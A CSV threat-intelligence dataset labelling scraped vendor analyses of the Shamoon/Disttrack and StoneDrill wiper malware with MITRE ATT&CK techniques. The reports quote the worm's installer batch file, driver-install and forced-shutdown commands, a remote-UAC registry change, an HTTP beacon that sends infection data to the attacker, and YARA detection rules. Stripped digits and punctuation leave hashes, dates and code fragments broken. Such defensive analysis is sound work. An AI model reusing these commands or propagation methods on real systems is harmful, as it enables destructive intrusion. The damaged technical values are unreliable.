url,mitre_domain,tactic_name,tech_name,tech_id,text,software_id
https://www.symantec.com/connect/blogs/shamoon-attacks,['enterprise-attack'],['impact'],"['Disk Structure Wipe', 'Data Destruction', 'Disk Structure Wipe']","['T1487', 'T1485', 'T1561', 'T1058', 'T1574', 'T1031']", Endpoint Protection   Symantec Enterprise Products Applications Support Company How To Buy Skip to main content  Press Enter   Sign in Skip auxiliary navigation  Press Enter   Register Skip main navigation  Press Enter   Toggle navigation Search Options HomeMy CommunitiesCommunities All CommunitiesEnterprise SoftwareMainframe SoftwareSymantec EnterpriseBlogs All BlogsEnterprise SoftwareMainframe SoftwareSymantec EnterpriseEvents All EventsEnterprise SoftwareMainframe SoftwareSymantec EnterpriseWater CoolerGroups Enterprise SoftwareMainframe SoftwareSymantec EnterpriseMembers Endpoint Protection   View Only Community Home Threads Library Events Members Back to Library The  MALWARE_NAME  Attacks   Recommend Aug                AM A L Johnson W    MALWARE_NAME  is a new threat that is being used in specific targeted attacks against at least one organization in the energy sector  It is a destructive malware that corrupts files on a compromised computer and overwrites the MBR  Master Boot Record  in an effort to render a computer unusable  W    MALWARE_NAME  consists of several components  Dropper the main component and source of the original infection  It drops a number of other modules   MALWARE_NAME  this module is responsible for the destructive functionality of the threat  Reporter this module is responsible for reporting infection information back to the attacker  Dropper Component The Dropper component performs the following actions  Copies itself to  System  trksvr exe Drops the following files embedded into resources  A    bit version of the dropper component   System  trksrv exe  contained in the  X     resource  Reporter component   System  netinit exe  contained in the  PKCS   resource   MALWARE_NAME  component   System   NAME SELECTED FROM LIST  exe  contained in the  PKCS    resource  Note  The name of the component is selected from the following list  caclsrv certutl clean ctrl dfrag dnslookup dvdquery event extract findfile fsutl gpget iissrv ipsecure msinit ntx ntdsutl ntfrsutil ntnw power rdsadmin regsys routeman rrasrv sacses sfmsc sigver smbinit wcscript Copies itself to the following network shares  ADMIN  C   WINDOWS D   WINDOWS E   WINDOWS Creates a task to execute itself Creates the following service to start itself whenever Windows starts  Service name  TrkSvr Display name  Distributed Link Tracking Server Image path   System  trksvr exe  MALWARE_NAME  Component The  MALWARE_NAME  component includes the following functionality  Deletes an existing driver from the following location and overwrites it with another legitimate driver   System  drivers drdisk sys The device driver is a clean disk driver that enables user mode applications to read and write to disk sectors  The driver is used to overwrite the computer s MBR but may be used for legitimate purposes  The file is digitally signed Executes the following commands that collect file names  which will be overwritten and writes them to f  inf and f  inf  Files from the f  inf and f  inf will be overwritten with the JPEG image shown below  Overwritten files are thus rendered useless  Figure    Image used to overwrite files Finally  the component will overwrite the MBR so that the compromised computer can no longer start The following string that points to the location of debug symbols was left in the  MALWARE_NAME  component of this threat and gives an idea of where the component was located on the developer s computer  C   MALWARE_NAME  ArabianGulf  MALWARE_NAME  release  MALWARE_NAME  pdb Reporter Component The Reporter component is responsible for sending infection information back to the attacker  Information is sent as a HTTP GET request and is structured as follows  http    DOMAIN  ajax modal modal data asp mydata  MYDATA  uid  UID  state  STATE  The following data is sent to the attacker   DOMAIN  a domain name  MYDATA  a number that specifies how many files were overwritten  UID  the IP address of the compromised computer  STATE  a random number Threats with such destructive payloads are unusual and are not typical of targeted attacks  Symantec Security Response is continuing to analyze this threat and will post more information as it becomes available  Symantec customers are protected from this threat  which our security products detect as W    MALWARE_NAME   Statistics   Favorited   Views   Files   Shares   Downloads Tags and Keywords Related Entries and Links No Related Resource entered  Products Applications Support Company How To Buy Copyright              Broadcom  All Rights Reserved  The term  Broadcom  refers to Broadcom Inc  and or its subsidiaries  Hosted by Higher Logic  LLC on the behalf of Broadcom   Privacy Policy   Cookie Policy   Supply Chain Transparency Terms of Use Copyright       All rights reserved  Powered by Higher Logic ,[]
http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/,['enterprise-attack'],"['impact', 'defense-evasion']","['Disk Structure Wipe', 'Masquerade Task or Service', 'Data Destruction', 'Disk Structure Wipe']","['T1487', 'T1036', 'T1485', 'T1561']",  MALWARE_NAME     Return of the  MALWARE_NAME   MALWARE_NAME  Protect Against Russia Ukraine Cyber Activity Menu Tools ATOMs Security Consulting About Us Under Attack   MALWARE_NAME     Return of the  MALWARE_NAME   MALWARE_NAME         people reacted     min  read Share By Robert Falcone November          at      PM Category  Unit    Tags   MALWARE_NAME   MALWARE_NAME   EMEA  Saudi Arabia   MALWARE_NAME     threat intelligence This post is also available in       Japanese In August       an attack campaign known as  MALWARE_NAME  targeted a Saudi Arabian energy company to deliver a malware called  MALWARE_NAME    MALWARE_NAME  is a multipurpose tool that exhibits worm like behavior by attempting to spread to other systems on a local network using stolen administrator credentials  More importantly  its claim to fame is the ability to destroy data and to render infected systems unusable  The attack four years ago resulted in        or more systems being damaged  Last week  Unit    came across new  MALWARE_NAME  samples that appear to have been used in an updated attack campaign  The attack targeted at least one organization in Saudi Arabia  which aligns with the targeting of the initial  MALWARE_NAME  attacks  It appears the purpose of the new  MALWARE_NAME  samples were solely focused on destruction  as the samples were configured with a non operational C  server to report to and were set to begin wiping data exactly on                   In another similarity to  MALWARE_NAME   this is the end of the work week in Saudi Arabia  their work week is from Sunday to Thursdays   so the malware had potentially the entire weekend to spread  The       MALWARE_NAME  attacks took place on Lailat al Qadr  the holiest night of the year for Muslims  another time the attackers could be reasonably certain employees would not be at work  Composition of  MALWARE_NAME   MALWARE_NAME  is comprised of three distinct parts  the dropper  communications and  MALWARE_NAME  components  The main  MALWARE_NAME  executable is a dropper that extracts additional tools from embedded resources and coordinates when to save and execute them  Embedded within each  MALWARE_NAME  sample is a component responsible for communicating with a C  server and a separate component used to carry out the wiping functionality  The dropper extracts the communications and  MALWARE_NAME  components from resources named  PKCS   and  PKCS    respectively  while the x   sample extracts the x   variant of  MALWARE_NAME  from a resource named  X      To extract the components  the dropper is configured to seek specific offsets within the resource  read a specified number of bytes and decrypt the contents using a specified key  The key exists in the sample as a base   encoded string that the dropper will decode then use each byte of the resulting string to XOR the data obtained from the resource  When determining the location of the ciphertext within the resource  the dropper subtracts    from the offset value in the sample s configuration as an additional layer of obfuscation  Table   shows the resources within the  MALWARE_NAME  x   sample  the component it contains and the values needed to decrypt its contents  Component Resource Name Offset Size Base   key x   Variant X                          tGLQqku m      Communications PKCS                       UPi IzQOAyiL     MALWARE_NAME  PKCS                         Lmqr nJgzFZ     Table   Resources containing  MALWARE_NAME  components  MALWARE_NAME  Functionality  MALWARE_NAME  is mainly focused on data destruction and attempting to damage as many systems as possible  To do so  this malware attempts to spread to other systems on network using what are likely stolen administrator credentials  This is again similar to the       MALWARE_NAME  attacks  where compromised but legitimate credentials obtained in advance of the attacks were also hard coded into the malware to aid in its propagation   MALWARE_NAME  also has the ability to download and execute additional applications to the system  as well as remotely set the date to start wiping systems  Local Network Spreading The  MALWARE_NAME  malware spreads to other systems automatically using stolen credentials  The  MALWARE_NAME  we analyzed contained the internal domain names and administrator credentials associated with the targeted organization  The internal domain and credentials appear to be stolen prior to the creation of this tool  as it is not a public domain and the credentials are not weak enough to have obtained through guessing  brute force or dictionary attacks   MALWARE_NAME  uses the internal domain names and credentials to log into remote systems on the same network segment  The malware determines the local network segment associated with the target system  call to gethostname  by obtaining the IP address for the system  call to gethostbyname   It then uses the system s IP addresses to enumerate the     network  x x x        that the system is networked with  and will attempt to spread to each of these remote systems  The dropper then attempts to open the service manager on each remote system to start the RemoteRegistry service  which it will connect to using RegConnectRegistryW  Once connected  the dropper attempts to disable UAC  User Access Control  remote restrictions by setting the following registry key to a value of      SOFTWARE Microsoft Windows CurrentVersion Policies System LocalAccountTokenFilterPolicy After disabling UAC  the dropper connects to the remote system  using NetUseAdd  and logs in using the embedded stolen credentials  The dropper then checks to see if it has administrator privileges on the remote system by attempting to open   system   csrss exe   which allows it to determine if it can write its payload to the   system    folder on the remote system  The dropper then has two different methods in which it can pivot to the remote system  The first method involves the dropper writing itself to   system   ntssrvr   exe  on the remote system  After writing itself to the remote system  the dropper creates a service named  ntssrv   with a display name of  Microsoft Network Realtime Inspection Service  and a description of  Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols  to execute the payload  The second  alternative method also involves the dropper copying itself to   system   ntssrvr   exe  on the remote system  however  instead of creating a remote service  this method calls the NetScheduleJobAdd function within the Windows netapi   library to create a scheduled task to run the payload  Scheduled tasks require a time in which the task will run  which the dropper determines by calling the function NetRemoteTOD to obtain the time of day from the remote system  The dropper then adds    seconds to the time of day value on the remote system and uses this value as the  JobTime  to run the task in three minutes  which executes the payload on the remote system  The following pseudo code shows the scheduled task creation process  NetRemoteTOD UncServerName   BufferPtr  NetApiBufferAllocate  x  u   AT INFO  AT INFO  Command   s pathToPayload  AT INFO  JobTime           BufferPtr  tod secs         BufferPtr  tod mins        BufferPtr  tod hours   BufferPtr  tod timezone         AT INFO  Flags   JOB NONINTERACTIVE  AT INFO  DaysOfMonth      AT INFO  DaysOfWeek      NetScheduleJobAdd UncServerName  AT INFO   v                  NetRemoteTOD UncServerName   BufferPtr NetApiBufferAllocate  x  u   AT INFO AT INFO  Command   s pathToPayload AT INFO  JobTime           BufferPtr  tod secs         BufferPtr  tod mins        BufferPtr  tod hours   BufferPtr  tod timezone        AT INFO  Flags   JOB NONINTERACTIVE AT INFO  DaysOfMonth     AT INFO  DaysOfWeek     NetScheduleJobAdd UncServerName  AT INFO   v    C  Communications  MALWARE_NAME  extracts the communication component from its resource named  PKCS    decrypts it and saves the resulting cleartext to the file  WINDOWS  system   netinit exe  The communication module interacts with its C  server using HTTP requests  The communications modules in both the x   and x   variants of  MALWARE_NAME  we analyzed were configured to use                for its C  server  which does not host an operational  MALWARE_NAME  C  server  The lack of an operational C  server suggests that the threat actors did not desire remote access to infected systems  rather the actors sought to render them unusable instead  If the modules were configured with an operational C  server  the module would generate an HTTP GET request that resembles the following  The interesting part of the request above is that the host  server   the URL  category  MALWARE_NAME  php   the parameter  shinu  and the user agent  Mozilla      MSIE      Windows NT       are hardcoded into the tool  The data in  shinu  parameter is a combination of the system s tickcount  local IP address  operating system version  keyboard layout and the contents of  WINDOWS  inf netimm    pnf  The C  server can respond to this HTTP request with one of the following two commands  Command Description E Provides an executable to run on the system  The executable is saved to  TEMP  Temp filer  tickcount  exe T Sets the time to start wiping the system  by writing the date to  WINDOWS  inf usbvideo    pnf  We believe the HTTP host value of  server  and the non operational           C  address may suggest that the communication module is created with a builder tool  which in this case the actor mistakenly or purposefully did not provide an active C  server when building this module  While completely speculative  the word  shinu  used as a parameter could be a reference to the Arabic slang for the word  what   as well as a reference to a village name in northwestern Iran   MALWARE_NAME  Data Destruction The  MALWARE_NAME  dropper is responsible for installing the  MALWARE_NAME  component of this Trojan  however  it will only activate this component if the system time is greater than a preset date  The dropper obtains a date used to activate the wiping functionality by reading a specific file  or using a hardcoded timestamp of                     The file containing this timestamp is named   inf usbvideo    pnf   which is not initially installed but is provided by the C  server if it sends the communications module the  T  command  The  usbvideo    pnf  file would have the following structure  BYTE year  BYTE month  BYTE day  BYTE hour  BYTE year  BYTE minute  If the dropper determines the system date is larger than the specified date  the dropper will extract the  MALWARE_NAME  component from a resource named  PKCS    and save it to the  system    folder with one of the following filenames appended with a   exe  extension  caclsrv certutl clean ctrl dfrag dnslookup dvdquery event findfile gpget ipsecure iissrv msinit ntfrsutil ntdsutl power rdsadmin regsys sigver routeman rrasrv sacses sfmsc smbinit wcscript ntnw netx fsutl extract The dropper then runs the  MALWARE_NAME  component with a command line argument of      The  MALWARE_NAME  component extracts a driver from its resource section and decrypts it with a     byte XOR key  The  MALWARE_NAME  saves the extracted driver to  C  Windows System   Drivers drdisk sys  and installs the kernel driver by creating a service named  drdisk  with the following command line commands  sc create drdisk type  kernel start  demand binpath  System   Drivers drdisk sys       nul sc start drdisk       nul     sc create drdisk type  kernel start  demand binpath  System   Drivers drdisk sys       nulsc start drdisk       nul The kernel driver is a commercial product that the attackers are abusing called RawDisk by EldoS Corporation  which provides direct access to files  disks and partitions  It appears that the  drdisk sys  driver  SHA         df ac  ff a f ad bf  b     bbebb  c   dd  f c     a       f   is the exact same driver as used in the  MALWARE_NAME  attack in       With the kernel driver installed  the  MALWARE_NAME  can begin writing to protected system locations  such as the master boot record  MBR  and partition tables of storage volumes  The  MALWARE_NAME  can be configured to overwrite files in three different ways  specified by a configuration setting of  F    R  or  E   If configured with the  F  setting  the  MALWARE_NAME  loads a resource named AJKEOA  which extracts a JPEG image to use to overwrite files and partition tables  If the  MALWARE_NAME  is configured with the  E  setting  the  MALWARE_NAME  will encrypt the contents of the file using a random value as a key and the RC  algorithm  If configured with the  R  setting  the  MALWARE_NAME  will overwrite files with the random values that would be used as a key in  E   The sample we analyzed was configured with  F   meaning it would overwrite files with an image obtained from its resource section  The image extracted is a picture of a Syrian boy named Alan Kurdi  whose drowning on September         received international attention in regards to the ongoing Syrian refugee crisis  The previous  MALWARE_NAME  attack in      used an image of a burning American flag  continuing the political image theme  From a functionality standpoint  the  MALWARE_NAME  relies on EldoS  RawDisk driver to overwrite files on the system  During this activity  we noticed the  MALWARE_NAME  changing the system time to August       as the temporary license key for the RawDisk driver requires the system time to not exceed the month of August  which is when the temporary license would expire  This modification to the system time was seen in the previous campaign  and the temporary license key within the  MALWARE_NAME  component is the exact same as  MALWARE_NAME  component from the      attacks  The  MALWARE_NAME  itself queries the following registry keys to obtain a list of partitions to overwrite  HKLM SYSTEM CurrentControlSet Control FirmwareBootDevice HKLM SYSTEM CurrentControlSet Control SystemBootDevice    HKLM SYSTEM CurrentControlSet Control FirmwareBootDeviceHKLM SYSTEM CurrentControlSet Control SystemBootDevice In addition to these partitions  the  MALWARE_NAME  attempts to overwrite files and subfolders within in the following folders  C  Documents and Settings C  Users C  Windows System   Drivers C  Windows System   Config systemprofile      C  Documents and SettingsC  UsersC  Windows System   DriversC  Windows System   Config systemprofile After overwriting these files and the partition tables  the  MALWARE_NAME  issues the following command to restart the system  shutdown  r  f  t     shutdown  r  f  t   The arguments and switches used in the  shutdown  command above forces all running applications to close and causes the system to reboot    r   after   seconds    t      This command does result in a dialog prompt  seen in Figure    that informs the user that the system is shutting down  Figure   Dialog prompt displayed when the  MALWARE_NAME  component runs the  shutdown  command With the partition tables overwritten  the system will no longer be able to properly boot  which renders the system unusable  During analysis  our analysis system was rendered unusable  as the virtual machine was unable to find the operating system during boot up  as seen in Figure    Figure   Analysis virtual machine unable to boot after executing  MALWARE_NAME   MALWARE_NAME  Conclusion After a four year hiatus  threat actors likely associated with the  MALWARE_NAME  attack campaign have used their  MALWARE_NAME  malware to target at least one organization in Saudi Arabia  The current attack campaign has several TTP overlaps with the original  MALWARE_NAME  campaign  especially from a targeting and timing perspective  Also   MALWARE_NAME  malware used in the recent attacks is very similar to the variant used in the      attacks  which uses the exact same RawDisk device driver as well  down to the same  temporary license key    The main purpose of the  MALWARE_NAME  malware is to overwrite files and storage partitions in an attempt to destroy data and render the system unusable  To maximize its destruction  the  MALWARE_NAME  tool attempts to spread to other systems on the network using stolen administrator credentials  which suggests that the threat actors had previous access to the network or carried out successful phishing attacks prior to the attack using  MALWARE_NAME   Palo Alto Networks customers are protected from  MALWARE_NAME   All known samples have a malicious verdict in WildFire AutoFocus customers can monitor  MALWARE_NAME  activity via the  MALWARE_NAME  tag Indicators of Compromise  MALWARE_NAME  Droppers   bb  cd    a  b ae   cf a d  fba d f dca a      d  f  d fe ac    x       a ebad dfc  d c     a        dc b  f a      b  ef   e       b  x    Communication Components    ceedbc cacf b  ae   de      e  aa  e cef  f       d     d  a   x      c c fc b         ac   ed abd bdab d d f ff       b d  b         x     MALWARE_NAME  Components c fc f c bed   b  a   ee fa   eb c ddaeb cd     ba d  cf     d a  x       fa    c fee     b     c a ccdf  c   ce         b efa    a acd  x    EldoS RawDisk Samples  a   b fa     cf  aae   fc   ce   a   b   c   ca  cedbb   b b  a  x        df ac  ff a f ad bf  b     bbebb  c   dd  f c     a       f   x    Get updates from Palo Alto Networks  Sign up to receive the latest news  cyber threat intelligence and research from us Please enter your email address  Please mark  I m not a robot  By submitting this form  you agree to our Terms of Use and acknowledge our Privacy Statement  Popular ResourcesResource Center Blog Communities Tech Docs Unit    Sitemap Legal NoticesPrivacy Terms of Use Documents AccountManage Subscriptions Report a Vulnerability        Palo Alto Networks  Inc  All rights reserved  ,[]
https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf,"['enterprise-attack', 'Enterprise']",['impact'],"['Disk Structure Wipe', 'Data Destruction', 'Disk Structure Wipe', 'Command and Scripting Interpreter: Visual Basic', 'Data Destruction', 'Indicator Removal on Host: File Deletion', 'Ingress Tool Transfer', 'Obfuscated Files or Information', 'Process Injection', 'Query Registry', 'Screen Capture', 'Software Discovery: Security Software Discovery', 'System Information Discovery', 'System Time Discovery', 'Virtualization/Sandbox Evasion', 'Windows Management Instrumentation']","['T1487', 'T1485', 'T1561', 'T1059', 'T1485', 'T1070', 'T1105', 'T1027', 'T1055', 'T1012', 'T1113', 'T1518', 'T1082', 'T1124', 'T1497', 'T1047', 'T1059', 'T1485', 'T1070', 'T1105', 'T1027', 'T1055', 'T1012', 'T1113', 'T1518', 'T1082', 'T1124', 'T1497', 'T1047', 'T1059', 'T1485', 'T1070', 'T1105', 'T1027', 'T1055', 'T1012', 'T1113', 'T1518', 'T1082', 'T1124', 'T1497', 'T1047', 'T1059', 'T1485', 'T1070', 'T1105', 'T1027', 'T1055', 'T1012', 'T1113', 'T1518', 'T1082', 'T1124', 'T1497', 'T1047', 'T1059', 'T1485', 'T1070', 'T1105', 'T1027', 'T1055', 'T1012', 'T1113', 'T1518', 'T1082', 'T1124', 'T1497', 'T1047', 'T1059', 'T1485', 'T1070', 'T1105', 'T1027', 'T1055', 'T1012', 'T1113', 'T1518', 'T1082', 'T1124', 'T1497', 'T1047']",FROM  MALWARE_NAME  TO  MALWARE_NAME  Wipers attacking Saudi organi zations and beyond Version                  Contact  intelreports kaspersky com   Beginning in November       Kaspersky Lab observed a new wave of  MALWARE_NAME  attacks directed at multiple targets in the Middle East  The malware used in the new attacks was a variant of the infamous  MALWARE_NAME  worm that targeted Saudi Aramco and Rasgas back in       Dormant for four years  one of the most mysterious wipers in history has returned  So far  we have observed three waves of attacks of the  MALWARE_NAME      malware  activated on    November          Nove mber      and    January       Also known as  MALWARE_NAME    MALWARE_NAME  is a highly destructive malware family that effectively wipes the victim machine  A group known as the Cutting Sword of Justice took credit for the Saudi Aramco attack by posting a Pastebin message on the day of the attack  back in         and justified the attack as a measure against the Saudi monarchy  The  MALWARE_NAME      attacks observed since November      have targeted organizations in various critic al and economic sectors in Saudi Arabia  Just like the previous variant  the  MALWARE_NAME       MALWARE_NAME  aims for the mass destruction of systems inside targeted organizations  The new attacks share many similarities with the      wave  though featuring new tools a nd techniques  During the first stage  the attackers obtain administrator credentials for the victim s network  Next  they build a custom  MALWARE_NAME    MALWARE_NAME       which leverages these credentials to spread wide ly inside the organization  Finally  on a predefin ed date  the  MALWARE_NAME  activates   rendering the victim s machines completely inoperable   It should be noted that the final stages of the attacks have their activity completely automated  without the need for communication with the command and control center  W hile i nvestigating the  MALWARE_NAME      attacks  Kaspersky Lab also discovered a previously unknown  MALWARE_NAME  malware which appears to be targeting organizations in Saudi Arabia  We re calling this new  MALWARE_NAME   MALWARE_NAME     MALWARE_NAME  has several  style  similarities t o  MALWARE_NAME    with multiple interesting factors and techniques to allow for the better evasion of detection  In addition to suspected Saudi targets  one victim of  MALWARE_NAME  was observed on the Kaspersky Security Network  KSN  in Europe  This makes us believe the threat actor behind  MALWARE_NAME  is expanding its wiping operations from the Middle East to Europe  To summarize some of the characteristics of the new  MALWARE_NAME  attacks  for both  MALWARE_NAME  and  MALWARE_NAME      MALWARE_NAME      includes a fully functional ransomware mo dule  in addition to its common wiping functionality     MALWARE_NAME      has both      bit and      bit components     The  MALWARE_NAME  samples we analyzed in January      do not implement any command and control  C C  communication  previous ones included a basic C C functi onality that referenced local servers in the victim s network     MALWARE_NAME  makes heavy use of evasion techniques to avoid sandbox execution     While  MALWARE_NAME  embeds Arabic   Yemen resource language sections   MALWARE_NAME  embeds mostly Persian resource language sec tions  Of course  we do not exclude the possibility of false flags     MALWARE_NAME  does not use drivers during deployment  unlike  MALWARE_NAME   but relies on memory injection of the wiping module into the victim s preferred browser    Contact  intelreports kaspersky com     Several similarities exist between  MALWARE_NAME  and  MALWARE_NAME      Multiple similarities were found between  MALWARE_NAME  and previously analysed News B eef attacks   What is new in this report  This report provides new insights into the  MALWARE_NAME      and  MALWARE_NAME  attacks  including     The discovery techniques and strategies we used for  MALWARE_NAME  and  MALWARE_NAME       Details on the ransomware functionality found in  MALWARE_NAME       This func tionality is currently inactive but could be used in future attacks      Details on the newly found  MALWARE_NAME  functions  including its destructive capabilities  even with limited user privileges       Details on the similarities between malware styles and malware components   source code found in  MALWARE_NAME    MALWARE_NAME  and NewsBeef     Contact  intelreports kaspersky com      From  MALWARE_NAME  to  MALWARE_NAME   the discovery       MALWARE_NAME   It s all about the  resources  Few people ever expected the return of  MALWARE_NAME  after four years of silence  This made the news from the Middle East on    November      quite surprising   and sent multiple shock waves through the industry  After the second wave of attacks  which took place on    November       it became quite clear that  MALWARE_NAME      was no longer an isolated incident  but part of a new series of attacks and we should expect more waves coming in   In order to make sure that Kaspersky Lab customers were protected  we started to develop specific detection strategies and hunt for possible new variants  To create the new det ections  we used multiple ideas    The  MALWARE_NAME  wipers have their additional payloads stored as encrypted resources    Just like in       the early  MALWARE_NAME      samples used resources with three very specific names    PKCS     PKCS    and  X      Because of thei r uniqueness it was relatively easy to find and detect them just by the resource names and their high entropy  Unfortunately  newer versions had random resource names like  ICO    LANG  and  MENU   so the ability to easily find new samples was lost  Howev er  all programmers  especially malware writers  have their own habits  and the authors of  MALWARE_NAME  are no exception    Since the  MALWARE_NAME       story   from        dd   b     ad caad  a a acf   e  until        cd a f e bcce    e  ec    d   a  many samples had one additional encrypted resource with a specific  although non   unique name        This finding got us thinking that the  MALWARE_NAME  attackers can re   use this pattern and we ve investigated ways of usi ng this to hunt for new  unknown malware generations from their side  As researchers  we tested a lot of different approaches to find similar malicious samples based on this artefact   and one of them worked unexpectedly  Here s the logic we used to create the detection     We assumed that for the next waves of attack the authors would continue to recompile the  MALWARE_NAME       version from       while trying to avoid AV detection  so we focused mostly on the newest  MALWARE_NAME  versions      We assumed that the  MALWARE_NAME  would again enumerate all files inside folders  so it w ould still call Windows API functions FindFirstFile and FindNextFile      Because it uses encrypted resources  we assumed that it would find and load them with the Windows API functions FindResource and LoadReso urce      Inside all known versions of  MALWARE_NAME         the resource       was found  with the following properties    Level of entropy         that means the data inside is encrypted or compressed     Contact  intelreports kaspersky com     Size about    KB   we ve decided to set the minimum limit at    KB     Language   neutral  not set   all other resources had the languages  Arabic  Yemen   or  English United States      Does not contain an unencrypted PE executable file inside   After initial testing  we decided to add more search criteria to limit the number of possible false positive detections     MALWARE_NAME  samples had no digital signature  so the sample would be unsigned     All known  MALWARE_NAME  samples with resource       had a maximum file size of     KB  so it s reasonable to limit the file size to twice that numbe r       KB    The number of resources inside the sample should not be too high   less than      Our favorite malware hunting tool  Yara   provides a rule   bused approach to create descriptions of malware families based on textual or binary patterns   Here s the detection rule we wrote using all the above conditions  import  pe  import  math  rule susp file enumerator with encrypted resource       meta  copyright    Kaspersky Lab  description    Generic detection for samples that enumerate files with encrypted resource called      hash     cd a f e bcce    e  ec    d   a  hash    c      e  b   ec  ccb  d a        version         strings   mz    This program cannot be run in DOS mode    a     Find FirstFile  ascii wide nocase  a     FindNextFile  ascii wide nocase  a     FindResource  ascii wide nocase  a     LoadResource  ascii wide nocase condition  uint          x A D and all of them and filesize          and pe number of sections     and pe number of signatures      and pe number of resources     and pe number of resources      and for any i in     pe number of resources          math entropy pe resources i  offset  pe resources i  length         and pe resources i  id         and pe resources i  length         and pe resources i  language      and   Contact  intelreports kaspersky com   not   mz in  pe resources i  offset  pe resources i  offset   pe resources i  length       While running the above Yara rule on Kaspersky Lab s samples selection   we found an interesting  fresh sample  After a quick analysis  we realized it was yet another  MALWARE_NAME    H owever  it was not  MALWARE_NAME    but something different  We ve decided to call it  MALWARE_NAME        From  MALWARE_NAME  to NewsBeef Having identified the  MALWARE_NAME  sample through the Yara technique above  we started looking for other possibly related samples  One Yara technique that has proved useful in the past for finding new malware variants is the development of Yara rules for decrypted malware components  Durin g attacks  malware components can be changed to fit the attackers  requirements   so hunting for decrypted malware code might help in finding new malware variants or even older samples  With  MALWARE_NAME   we developed several Yara rules for the decrypted payl oads  Here s one of our Yara rules for a decrypted  MALWARE_NAME  module  rule  MALWARE_NAME  main sub   meta  author    Kaspersky Lab  description    Rule to detect  MALWARE_NAME   decrypted  samples  hash    d     f    fd b  e     bd    fe   hash    ac c     c         b    f   ba d  version         strings   code    B        FE  F FF     F             B   F       FF                B        FE  F FF     F           B                B           F                  condit ion  uint          x A D and  code and filesize             Interestingly  this rule allowed us to find a new category of samples  which we previously connected with a threat actor named News B eef  We wrote about News B eef roughly one year ago  in relation to another set of attacks against oil and energy companies from the Middle East     Contact  intelreports kaspersky com   Further analysis indicated the malware sam ples from  MALWARE_NAME  and News B eef appear to be connected together through numerous internal similarities  The use of simple logic in conjunction with a knowledge of Yara can help attain a state   of   the   art outcome in malware hunting activity  If you would l ike to learn more  you can join us for the Yara training   Hunt APTs with Yara like a GReAT Ninja   and the advanced   Malware Reverse Engineering course   on April             in St  Maarten   Several private intelligence reports on  MALWARE_NAME    MALWARE_NAME  and NewsBeef are available to subscribers o f Kaspersky Lab s Private Intelligence Reports   For more information please contact  intelreports kaspersky com   Contact  intelreports kaspersky com      Technical details    MALWARE_NAME        language usage and possible Yemeni links Several good technical articles on  MALWARE_NAME      have been published by some of our colleagues   including Palo Alto   IBM X   Force   Symantec and others  Throughout this blog we describe some of the technical details of the new  MALWARE_NAME      attacks and what are the most important things that make them stand out  For the analysis we used the earliest set of samples   with a hardcoded attack date of    November        H owever  we ve also included details from the newer samples   such as hardc oded credentials  During deployment in the victim s environment  the main  MALWARE_NAME       MALWARE_NAME  module is installed through a Windows Batch file with the following content   echo off set u    ntertmgr   exe set u    service set u      dp  copy  Y   u     u        systemroot    system      u      start  b  systemroot    system      u      u     Interestingly  the sample resources appear to have a language ID of  Arabic  Yemen    suggesting the attackers might be from Yemen  Of course  we should not disreg ard the possibility that the resource language could be a false flag planted there by the attackers            bit  MALWARE_NAME  dropper worm  ntssrvr   exe  SHA       a ebad dfc  d c     a        dc b  f a      b  ef   e       b MD      f  d        ae aca fce       Compiled                      GMT   VC      Type I    Console EXE Size           bytes This executable is a worm designed to infect computers connected to a Windows domain  To achieve this  it relies on a list of hardc oded  previously stolen username password pairs belonging to administrators of the targeted domain  All the strings in the malware are obfuscated   Contact  intelreports kaspersky com   with simple one byte ADD operations and are decrypted upon execution  All the dropped files exhibit file times altered to match that of the system s kernel   dll   The module only works if it is run with exactly one command line parameter  regardless of the parameter  Otherwise  it simply exits  likely a measure to avoid accidental execution   If the victim host s system   PROCESSOR ARCHITECTURE   environment variable is   AMD     or   amd      the module installs its      bit variant  The variant is contained within a resource named  X      The resource is de   XORed and dropped onto the system under     WindowsDir    system     ntssrvr   exe    It is then installed as a service via the command   cmd exe  c  ping   n               nul    sc config NtsSrv binpath   C    WINDOWS   system     ntssrvr   exe LocalService     ping   n               nul    sc start NtsSrv         Installation as a Service If the malware is running on a      bit system  this module installs itself as a service named  NtsSrv   Name Display Name Description NtsSrv Microsoft Network Realtime Inspection Service Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols he service is set as dependent on the  RpcSs  system service  The properties of the system service  LanmanWorkstation  are changed so that it depends on the newly created  NtsS rv  service to allow it to start after the malware         Worm Functionality Once this module runs  as a service   the worm   spreading functionality is started   targeting every network host within the IPv  address range   with the same first three bytes of the victim s IP and the last byte in the range from   to      thus operating inside subnet class C  a b c        Here s how it works     The worm connects to a remote machine s registry and disables Remote UAC by setting the LocalAccountTokenFilterPolicy regi stry key value to   in HKEY LOCAL MACHINE   SOFTWARE   Microsoft   Windows   CurrentVersion   Policies   system     If the RemoteRegistry system service is disabled and doesn t run on the target system  the worm reconfigures this service to be auto   started and then start s it immediately  If the connection to a remote registry is unsuccessful  the worm repeats the connection attempt with a hardcoded set of stolen domain administrator credentials  The worm then   Contact  intelreports kaspersky com   searches for remote     windows   system     csrss exe   files by prep ending this path with the victim machine s IP as well as system shares    ADMIN       C       D       E        Once a remote system   folder is found  the worm copies itself into this folder under the name   ntssrvr   exe    It schedules a remote job to run   ntssrvr    exe LocalService   after    seconds     If the remote scheduler is inaccessible  the worm tries to set up NtsSrv and runs the service on the remote machine with the same parameters as it used for self   installation  Attempts with stolen credentials are also pe rformed     An alternative but similar infection method is coded in to the worm  where each infection is performed in a separate thread without relying on the scheduler  but it is not used at this time         Command and Control  C C  Module After replication   the malware runs a command   and   control communication module  This module is contained within a resource named   Pkcs     It is de   XORed and dropped as    WindowsDir    system     netinit exe    Using the hardcoded credentials  it creates a Windows Task Scheduler job that executes netinit exe    seconds after creation  It waits    seconds and then deletes the scheduled job          MALWARE_NAME  and Encryptor Module Finally  the malware drops the  MALWARE_NAME  encryptor module  This module first checks if it s time to run the main payload  The activation period can be set in two ways     It checks if the system time is not earlier than the time specified in the following file    windir    inf   usbvideo    pnf     If the file does n t exist  it checks that the system time is not earlier than the hardcoded date             Nov       At the specified time  the malware drops two files  The first file   c    windows   temp   key        pub  is unused in this attack and contains a public encry ption key  This is an indicator that the attackers might be using  MALWARE_NAME  as a ransomware tool in upcoming waves          BEGINPUBLICKEY       MIICIjANBgkqhkiG w BAQEFAAOCAg AMIICCgKCAgEAusZItknNNeV xjPzIZLyB m gaNREC I CZQ F 